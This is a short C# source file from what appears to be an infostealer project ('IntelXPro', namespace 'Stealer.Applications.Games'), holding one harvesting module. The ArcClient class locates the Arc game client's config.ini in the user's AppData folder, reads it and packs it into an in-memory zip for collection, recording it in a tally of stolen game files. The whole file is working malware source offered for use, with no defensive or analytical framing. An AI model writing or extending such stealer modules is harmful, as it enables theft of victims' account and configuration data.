using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Games
{
    internal class ArcClient : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Arc", "config.ini");
            if (File.Exists(text))
            {
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Arc Client";
                string text2 = "ArcClient\\config.ini";
                zip.AddFile(text2, File.ReadAllBytes(text));
                counterApplications.Files.Add(text + " => " + text2);
                counterApplications.Files.Add("ArcClient\\");
                counter.Games.Add(counterApplications);
            }
        }
    }
}
